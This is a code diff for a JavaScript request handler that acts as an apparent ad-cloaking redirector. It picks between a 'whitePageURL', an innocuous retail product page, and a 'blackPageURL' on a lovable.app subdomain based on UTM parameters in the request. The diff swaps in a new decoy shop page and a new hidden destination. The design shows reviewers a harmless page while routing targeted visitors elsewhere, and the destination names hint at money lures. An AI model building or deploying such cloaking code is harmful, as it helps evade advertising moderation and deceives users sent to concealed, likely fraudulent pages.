@@ -1,7 +1,7 @@
 export default function handler(req, res) {
     // URLs to redirect
-    const whitePageURL = "https://www.fanatics.com/soccer-national-teams/germany-national-team/germany-national-team-adidas-infant-2022-home-kit-white/o-3690+t-03279445+p-04622277382+z-9-2165802811?_ref=p-GALP:m-GRID:i-r0c0:po-0";
-    const blackPageURL = "https://lovefrecashhhh.lovable.app/?";
+    const whitePageURL = "https://phonecase.pk/collections/laptop-bags-cases/products/baseus-laptop-bag-for-macbook-air-pro-14-13-15-15-6-16-inch-fashion-travel-laptop-backpack-for-mac-ipad-pro-notebook-school-bag?variant=37762453799066";
+    const blackPageURL = "https://msgurupml.lovable.app/";
   
     // Parse the UTM parameters from the request URL
     const queryParams = new URLSearchParams(req.url.split('?')[1]);
@@ -26,6 +26,7 @@ export default function handler(req, res) {
     res.end();
 
   }
+
 
 
 
